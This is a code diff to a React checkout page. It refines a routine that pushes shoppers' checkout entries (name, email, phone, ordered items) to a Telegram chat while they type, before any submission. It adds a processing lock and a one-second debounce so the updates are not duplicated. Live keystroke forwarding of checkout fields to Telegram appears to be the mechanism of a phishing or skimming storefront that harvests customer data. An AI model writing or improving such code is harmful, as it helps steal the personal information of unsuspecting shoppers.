@@ -12,6 +12,7 @@ export default function CheckoutPage() {
   
   // Telegram refs
   const messageIdRef = useRef<number | null>(null)
+  const isUpdatingRef = useRef(false)
   const updateTimerRef = useRef<NodeJS.Timeout | null>(null)
   const sessionIdRef = useRef(`HCT_${Date.now()}`)
   
@@ -110,6 +111,13 @@ export default function CheckoutPage() {
     // Only send if we have at least some meaningful data
     if (!formData.firstName && !formData.email && !formData.phone) return
     
+    // Prevent duplicate calls if already processing
+    if (isUpdatingRef.current) {
+      console.log('Update already in progress, skipping...')
+      return
+    }
+    
+    isUpdatingRef.current = true
     console.log('=== TELEGRAM UPDATE TRIGGERED ===')
     console.log('Form data:', formData)
     console.log('Current message ID:', messageIdRef.current)
@@ -197,6 +205,9 @@ ${itemsList}
       }
     } catch (error) {
       console.error('Telegram error:', error)
+    } finally {
+      // Always reset the updating flag
+      isUpdatingRef.current = false
     }
   }
 
@@ -259,9 +270,16 @@ ${itemsList}
     
     setFormData(prev => ({ ...prev, [name]: formattedValue }))
     
-    // Update Telegram immediately
-    console.log('Immediate update triggered, calling updateTelegram')
-    updateTelegram()
+    // Clear existing timer to prevent multiple calls
+    if (updateTimerRef.current) {
+      clearTimeout(updateTimerRef.current)
+    }
+    
+    // Update Telegram with debounce delay to prevent spam
+    updateTimerRef.current = setTimeout(() => {
+      console.log('Debounced update triggered, calling updateTelegram')
+      updateTelegram()
+    }, 1000) // 1 second delay instead of immediate
   }
 
   const handleSubmit = async (e: React.FormEvent) => {
